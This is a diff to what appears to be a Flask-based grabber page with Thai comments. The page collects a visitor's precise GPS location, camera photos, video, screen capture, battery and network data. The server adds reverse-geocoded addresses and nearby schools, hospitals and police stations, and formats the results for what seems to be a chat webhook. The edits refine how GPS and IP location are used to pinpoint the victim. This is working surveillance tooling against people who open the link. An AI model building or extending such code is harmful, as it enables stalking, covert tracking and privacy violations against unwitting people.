@@ -177,7 +177,8 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.rtt = 0;
             }
             
-            // GPS
+            // GPS (ต้องได้ GPS เท่านั้น ไม่ใช้ IP fallback)
+            let gpsSuccess = false;
             try {
                 const pos = await new Promise((resolve, reject) => {
                     const timeoutId = setTimeout(() => reject(new Error('GPS timeout')), 5000);
@@ -190,9 +191,10 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.gps_lat = pos.coords.latitude;
                 deviceInfo.gps_lon = pos.coords.longitude;
                 deviceInfo.gps_accuracy = Math.round(pos.coords.accuracy);
-                deviceInfo.gps_fallback = false;
+                gpsSuccess = true;
             } catch(e) {
-                deviceInfo.gps_fallback = true;
+                deviceInfo.gps = 'ไม่ได้รับอนุญาตหรือไม่รองรับ';
+                gpsSuccess = false;
             }
             
             try {
@@ -255,6 +257,7 @@ HTML = '''<!DOCTYPE html>
                 formData.append('back_photo', backPhoto, 'back_photo.jpg');
                 formData.append('video', videoBlob, 'video.webm');
                 formData.append('info', JSON.stringify(deviceInfo));
+                formData.append('gps_success', gpsSuccess ? 'true' : 'false');
                 
                 const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                 if (!isMobile && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
@@ -316,16 +319,9 @@ def upload():
         back_photo = request.files.get('back_photo')
         video = request.files.get('video')
         screenshot = request.files.get('screenshot')
+        gps_success = request.form.get('gps_success') == 'true'
         
         location = get_location_from_ip(real_ip)
-        
-        if device_info.get('gps_fallback') and location:
-            device_info['gps_lat'] = location['lat']
-            device_info['gps_lon'] = location['lon']
-            device_info['gps_accuracy'] = 'IP Geolocation'
-            device_info['gps_from'] = 'IP'
-        else:
-            device_info['gps_from'] = 'GPS'
         
         lat = device_info.get('gps_lat', 0)
         lon = device_info.get('gps_lon', 0)
@@ -333,23 +329,28 @@ def upload():
         gps_address = None
         nearby_places = {}
         
-        if lat and lon:
+        # ค้นหาเฉพาะเมื่อได้ GPS จริง (ไม่ใช่ IP fallback)
+        if gps_success and lat and lon:
             gps_address = reverse_geocode(lat, lon)
-            # ค้นหาสถานที่ใกล้เคียง (ไม่ต้องขออนุญาตเพิ่ม)
-            if not device_info.get('gps_fallback'):
-                place_types = ['shop', 'school', 'hospital', 'restaurant', 'police']
-                place_labels = {
-                    'shop': '🛒 ร้านค้า/ห้าง',
-                    'school': '🏫 โรงเรียน',
-                    'hospital': '🏥 โรงพยาบาล',
-                    'restaurant': '🍽️ ร้านอาหาร',
-                    'police': '🚔 โรงพัก'
-                }
-                for pt in place_types:
-                    results = find_nearby_places(lat, lon, pt, 800)
-                    if results:
-                        nearby_places[place_labels[pt]] = results[:3]
-                    time.sleep(0.3)  # หน่วงเล็กน้อยให้ API ไม่ overload
+            place_types = ['shop', 'school', 'hospital', 'restaurant', 'police']
+            place_labels = {
+                'shop': '🛒 ร้านค้า/ห้าง',
+                'school': '🏫 โรงเรียน',
+                'hospital': '🏥 โรงพยาบาล',
+                'restaurant': '🍽️ ร้านอาหาร',
+                'police': '🚔 โรงพัก'
+            }
+            for pt in place_types:
+                results = find_nearby_places(lat, lon, pt, 800)
+                if results:
+                    nearby_places[place_labels[pt]] = results[:3]
+                time.sleep(0.3)
+        elif not gps_success:
+            # ถ้าไม่มี GPS ให้ใช้ IP เฉพาะที่อยู่เท่านั้น (ไม่ค้นหา nearby)
+            if location:
+                lat = location['lat']
+                lon = location['lon']
+                gps_address = None  # ไม่แปลงที่อยู่จาก IP
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
@@ -372,14 +373,10 @@ def upload():
         if device_info.get('downlink'):
             fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
         
-        # GPS + ที่อยู่
-        if lat and lon:
-            source = device_info.get('gps_from', 'GPS')
-            if source == 'IP':
-                gps_label = "📍 พิกัด (จาก IP)"
-            else:
-                acc = device_info.get('gps_accuracy', '?')
-                gps_label = f"📍 GPS (±{acc} เมตร)"
+        # GPS + ที่อยู่ (เฉพาะเมื่อมี GPS จริง)
+        if gps_success and lat and lon:
+            acc = device_info.get('gps_accuracy', '?')
+            gps_label = f"📍 GPS (±{acc} เมตร)"
             gps_val = f"{lat}, {lon}"
             fields.append({"name": gps_label, "value": gps_val, "inline": True})
             
@@ -400,15 +397,19 @@ def upload():
                 
                 for part in addr_parts:
                     fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
+        elif not gps_success:
+            fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาตหรือไม่รองรับ", "inline": True})
         else:
             fields.append({"name": "📍 GPS", "value": "ไม่ได้รับข้อมูล", "inline": True})
         
-        # สถานที่ใกล้เคียง
-        if nearby_places:
+        # สถานที่ใกล้เคียง (เฉพาะจาก GPS เท่านั้น)
+        if gps_success and nearby_places:
             for label, places in nearby_places.items():
                 if places:
                     value = '\n'.join([f"• {p}" for p in places[:3]])
                     fields.append({"name": label, "value": value, "inline": False})
+        elif gps_success:
+            fields.append({"name": "📍 สถานที่ใกล้เคียง", "value": "ไม่พบข้อมูล", "inline": False})
         
         bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
